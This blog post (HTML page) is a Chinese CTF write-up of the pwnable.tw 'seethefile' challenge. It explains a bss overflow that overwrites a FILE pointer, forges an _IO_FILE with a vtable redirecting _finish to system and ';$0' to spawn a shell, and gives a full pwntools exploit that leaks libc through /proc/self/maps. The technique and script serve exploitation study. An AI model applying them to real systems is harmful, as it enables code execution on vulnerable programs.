@@ -1,0 +1,215 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>pwn入门-49-pwnable之seethefile | 唐仔橙</title><meta name="author" content="唐仔橙,tangzicheng233@gmail.com"><meta name="copyright" content="唐仔橙"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="主要参考: https:&#x2F;&#x2F;xuanxuanblingbling.github.io&#x2F;ctf&#x2F;pwn&#x2F;2020&#x2F;04&#x2F;03&#x2F;file&#x2F; 2.23版本没有做检查, 简单入门下iofile 利用分析Ubuntu GLIBC 2.23-0ubuntu5 1234567891011121314151617181920212223242526272829303132333435363738394041int">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn入门-49-pwnable之seethefile">
+<meta property="og:url" content="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/index.html">
+<meta property="og:site_name" content="唐仔橙">
+<meta property="og:description" content="主要参考: https:&#x2F;&#x2F;xuanxuanblingbling.github.io&#x2F;ctf&#x2F;pwn&#x2F;2020&#x2F;04&#x2F;03&#x2F;file&#x2F; 2.23版本没有做检查, 简单入门下iofile 利用分析Ubuntu GLIBC 2.23-0ubuntu5 1234567891011121314151617181920212223242526272829303132333435363738394041int">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tangzichengcc.github.io/img/background/1.png">
+<meta property="article:published_time" content="2024-01-28T14:31:00.000Z">
+<meta property="article:modified_time" content="2024-01-28T14:33:12.059Z">
+<meta property="article:author" content="唐仔橙">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tangzichengcc.github.io/img/background/1.png"><link rel="shortcut icon" href="/img/favicon.webp"><link rel="canonical" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="MTZmw-Jp9gUmwt4q-TLzEzI1_TFDA2QpQLuyUeOqzk4"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":500,"languages":{"author":"作者: 唐仔橙","link":"链接: ","source":"来源: 唐仔橙","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pwn入门-49-pwnable之seethefile',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-28 22:33:12'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background/1.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">唐仔橙</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pwn入门-49-pwnable之seethefile</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-28T14:31:00.000Z" title="发表于 2024-01-28 22:31:00">2024-01-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-28T14:33:12.059Z" title="更新于 2024-01-28 22:33:12">2024-01-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pwn入门-49-pwnable之seethefile"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>主要参考: <a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/04/03/file/">https://xuanxuanblingbling.github.io/ctf/pwn/2020/04/03/file/</a></p>
+<p>2.23版本没有做检查, 简单入门下iofile</p>
+<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><p>Ubuntu GLIBC 2.23-0ubuntu5</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> nptr; <span class="comment">// [esp+Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  init();</span><br><span class="line">  welcome();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;nptr);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(&amp;nptr) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        openfile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        readfile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        writefile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        closefile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Leave your name :&quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thank you %s ,see you next time\n&quot;</span>, &amp;name);</span><br><span class="line">        <span class="keyword">if</span> ( fp )</span><br><span class="line">          fclose(fp);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invaild choice&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>​	一眼顶针  name存在溢出，可以溢出到fp, 并且保护没有开PIE,可以知道地址,</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0804B</span>260 name            db <span class="number">20</span>h <span class="title function_">dup</span><span class="params">(?)</span>           ; DATA XREF: main+<span class="number">9F</span>↑o</span><br><span class="line">.bss:<span class="number">0804B</span>260                                         ; main+B4↑o</span><br><span class="line">.bss:<span class="number">0804B</span>280                 public fp</span><br><span class="line">.bss:<span class="number">0804B</span>280 ; FILE *fp</span><br><span class="line">.bss:<span class="number">0804B</span>280 fp              dd ?                    ; DATA XREF: openfile+<span class="number">6</span>↑r</span><br><span class="line">.bss:<span class="number">0804B</span>280                                         ; openfile+AD↑w ...</span><br><span class="line">.bss:<span class="number">0804B</span>280 _bss            ends</span><br><span class="line">.bss:<span class="number">0804B</span>280</span><br></pre></td></tr></table></figure>
+
+
+
+<p>​	fp这里是一个FILE结构体，如何利用呢？</p>
+<p>​	伪造一个fake FILE，放到bss后面就可以了，地址也知道，然后覆盖地址为伪造的FILE地址</p>
+<h1 id="伪造iofile及其虚表"><a href="#伪造iofile及其虚表" class="headerlink" title="伪造iofile及其虚表"></a>伪造iofile及其虚表</h1><p>​	如何伪造？ 各个变量的值应该是多少？、</p>
+<p>​	file结构：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/">https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fakeFILE = <span class="number">0x0804B284</span></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += p32(fakeFILE)</span><br><span class="line">payload += p32(<span class="number">0xffffdfff</span>)</span><br><span class="line">payload += <span class="string">&quot;;$0&quot;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x8d</span> </span><br><span class="line">payload += p32(fakeFILE+<span class="number">0x98</span>)  <span class="comment">// 这是虚表地址</span></span><br><span class="line">payload += p32(system_addr)*<span class="number">3</span>  <span class="comment">// 虚表内容</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>​	iofile的结构如下图: </p>
+<p><img src="/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/image-20230807102222274.png" alt="img"></p>
+<h2 id="伪造flags-从而触发-finish"><a href="#伪造flags-从而触发-finish" class="headerlink" title="伪造flags 从而触发_finish"></a>伪造flags 从而触发_finish</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_flags&amp;0x2000为0就会直接调用_IO_FINSH(fp),_IO_FINSH(fp)相当于调用fp-&gt;vtable-&gt;_finish(fp)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>​	所以最后是调用了_IO_file_finish触发的（fclose？）， 为什么不用&#x2F;bin&#x2F;sh呢？</p>
+<h2 id="伪造虚表"><a href="#伪造虚表" class="headerlink" title="伪造虚表"></a>伪造虚表</h2><p>​	IOFILE之后就是 _IO_file_jumps，所以，可以劫持这个vtable指针，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="title function_">sizeof</span><span class="params">(_IO_FILE)</span></span><br><span class="line">$4 = <span class="number">148</span></span><br></pre></td></tr></table></figure>
+
+<p>​	大小是148， 也就是0x94, 0x94这里存的是虚表的地址,所以 虚表的位置位于fakeFILE+0x94 + 4</p>
+<p>​	_finish位于第三个位置,所以把第三个位置伪造成system就行了</p>
+<h2 id="0是什么？"><a href="#0是什么？" class="headerlink" title=";$0是什么？"></a>;$0是什么？</h2><p>;是隔断命令的意思, $0经过实验是bash</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>exp一直没成功，估计是栈平衡的事？ 不像, libc的事</p>
+<p>本地和远程还不太一样, 远程的话,接收到的libc地址需要+0x1000( 在调试的时候能发现这一个特殊的地方,虽然不知道是干啥的,</p>
+<p>远程打通的exp</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="title function_">context</span><span class="params">(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">myelf  = ELF(<span class="string">&quot;./seethefile&quot;</span>)</span><br><span class="line"><span class="meta">#libc   = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span></span><br><span class="line">libc   = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">io     = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10200</span>)</span><br><span class="line"><span class="meta">#io = process(<span class="string">&quot;./seethefile&quot;</span>)</span></span><br><span class="line">sla          = lambda delim,data       :io.sendlineafter(delim, data)</span><br><span class="line">openfile     = lambda name :  (sla(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;1&quot;</span>),sla(<span class="string">&quot;see :&quot;</span>,name))</span><br><span class="line">readfile     = lambda      :  (sla(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;2&quot;</span>))</span><br><span class="line">showfile     = lambda      :  (sla(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;3&quot;</span>))</span><br><span class="line">leave        = lambda name :  (sla(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;5&quot;</span>),sla(<span class="string">&quot;ame :&quot;</span>,name))</span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line"><span class="meta"># leak libc</span></span><br><span class="line">openfile(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">readfile()</span><br><span class="line">showfile()</span><br><span class="line">io.recvuntil(<span class="string">&quot;[heap]\n&quot;</span>)</span><br><span class="line">libc_addr = <span class="type">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>) + <span class="number">0x1000</span></span><br><span class="line">print(<span class="string">&quot;libc:&quot;</span>,hex(libc_addr))</span><br><span class="line">system_addr = libc_addr +libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">print(hex(system_addr))</span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line"><span class="meta"># make fake file</span></span><br><span class="line">fakeFILE = <span class="number">0x0804B284</span></span><br><span class="line">payload  = b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += p32(fakeFILE)</span><br><span class="line">payload += p32(<span class="number">0xffffdfff</span>)</span><br><span class="line">payload += b<span class="string">&quot;;$0&quot;</span>+b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>*<span class="number">0x8d</span></span><br><span class="line">payload += p32(fakeFILE+<span class="number">0x98</span>)</span><br><span class="line">payload += p32(system_addr)*<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># getshell</span></span><br><span class="line">leave(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://tangzichengcc.github.io">唐仔橙</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/">https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://tangzichengcc.github.io" target="_blank">唐仔橙</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/background/1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/"><img class="next-cover" src="/img/background/10.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">pwn入门-48-setcontext应用</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/profile.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">唐仔橙</div><div class="author-info__description">喜欢探索世界,在读研究生,计算机爱好者的成长记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/tangzichengcc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">会记录自己的学习经历,以及一些经历,如果有想法或者疑惑,欢迎交流!!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">利用分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0iofile%E5%8F%8A%E5%85%B6%E8%99%9A%E8%A1%A8"><span class="toc-number">2.</span> <span class="toc-text">伪造iofile及其虚表</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0flags-%E4%BB%8E%E8%80%8C%E8%A7%A6%E5%8F%91-finish"><span class="toc-number">2.1.</span> <span class="toc-text">伪造flags 从而触发_finish</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E8%99%9A%E8%A1%A8"><span class="toc-number">2.2.</span> <span class="toc-text">伪造虚表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.3.</span> <span class="toc-text">;$0是什么？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">3.</span> <span class="toc-text">exp</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/" title="pwn入门-49-pwnable之seethefile"><img src="/img/background/1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-49-pwnable之seethefile"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/" title="pwn入门-49-pwnable之seethefile">pwn入门-49-pwnable之seethefile</a><time datetime="2024-01-28T14:31:00.000Z" title="发表于 2024-01-28 22:31:00">2024-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/" title="pwn入门-48-setcontext应用"><img src="/img/background/10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-48-setcontext应用"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/" title="pwn入门-48-setcontext应用">pwn入门-48-setcontext应用</a><time datetime="2024-01-27T15:28:41.000Z" title="发表于 2024-01-27 23:28:41">2024-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/" title="pwn入门-47-zh3R0CTF2021-moreprintf"><img src="/img/background/15.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-47-zh3R0CTF2021-moreprintf"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/" title="pwn入门-47-zh3R0CTF2021-moreprintf">pwn入门-47-zh3R0CTF2021-moreprintf</a><time datetime="2023-11-12T15:40:29.000Z" title="发表于 2023-11-12 23:40:29">2023-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/" title="c语言回炉重造-unix系统接口"><img src="/img/background/10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="c语言回炉重造-unix系统接口"/></a><div class="content"><a class="title" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/" title="c语言回炉重造-unix系统接口">c语言回炉重造-unix系统接口</a><time datetime="2023-11-12T07:29:52.000Z" title="发表于 2023-11-12 15:29:52">2023-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" title="pwn入门-46-glibc源码调试"><img src="/img/background/4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-46-glibc源码调试"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" 